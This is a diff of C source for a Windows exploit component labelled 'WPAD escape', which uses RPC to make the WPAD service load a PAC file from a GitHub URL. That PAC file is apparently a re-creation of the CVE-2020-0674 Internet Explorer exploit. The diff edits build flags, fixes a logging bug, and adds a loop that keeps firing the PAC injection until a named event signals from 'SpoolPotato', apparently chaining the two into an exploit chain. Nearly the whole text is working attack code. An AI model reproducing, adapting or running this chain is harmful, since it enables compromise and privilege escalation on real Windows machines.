@@ -10,10 +10,10 @@
 // Global settings
 ////////
 
-//#define DEBUG
-//#define EXE_BUILD
-#define DLL_BUILD
-#define SHELLCODE_BUILD
+#define DEBUG
+#define EXE_BUILD
+//#define DLL_BUILD
+//#define SHELLCODE_BUILD
 #define TARGET_PAC_URL L"https://raw.githubusercontent.com/forrest-orr/ExploitDev/master/Exploits/Re-creations/Internet%20Explorer/CVE-2020-0674/x64/Forrest_Orr_CVE-2020-0674_64-bit.pac"
 
 ////////
@@ -32,7 +32,7 @@ void DebugLog(const wchar_t *Format, ...) {
     MessageBoxW(0, pBuffer, L"WPAD escape", 0);
 #endif
 #ifdef EXE_BUILD
-    printf("%ws\r\n", Buffer);
+    printf("%ws\r\n", pBuffer);
 #endif
     HeapFree(GetProcessHeap(), 0, pBuffer);
 }
@@ -192,11 +192,21 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
 
 #ifdef DLL_BUILD
 BOOL DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
+    HANDLE hEvent;
+
     switch (dwReason) {
         case DLL_PROCESS_ATTACH:
 #ifdef SHELLCODE_BUILD
-            WpadInjectPac(TARGET_PAC_URL);
-            Sleep(INFINITE);
+            hEvent = CreateEventW(NULL, TRUE, FALSE, L"DoubleStarSync");
+
+            while (TRUE) {
+                DebugLog(L"... sending PAC update RPC signal to WPAD...");
+                WpadInjectPac(TARGET_PAC_URL);
+                if (WaitForSingleObject(hEvent, 3000) == WAIT_OBJECT_0) {
+                    DebugLog(L"... received sync signal from SpoolPotato");
+                    break;
+                }
+            }
 #else
             CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WpadInjectPac, (PVOID)TARGET_PAC_URL, 0, NULL);
 #endif
@@ -217,8 +227,17 @@ int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
         DebugLog(L"... no PAC URL argument provided");
     }
     else {
-        RPC_STATUS RpcStatus = WpadInjectPac(pArgv[1]);
-        DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x", RpcStatus);
+        HANDLE hEvent = CreateEventW(NULL, TRUE, FALSE, L"DoubleStarSync");
+
+        while (TRUE) {
+            DebugLog(L"... sending PAC update RPC signal to WPAD...");
+            RPC_STATUS RpcStatus = WpadInjectPac(pArgv[1]);
+            DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x", RpcStatus);
+            if (WaitForSingleObject(hEvent, 3000) == WAIT_OBJECT_0) {
+                DebugLog(L"... received sync signal from SpoolPotato");
+                break;
+            }
+        }
     }
 
     return 0;
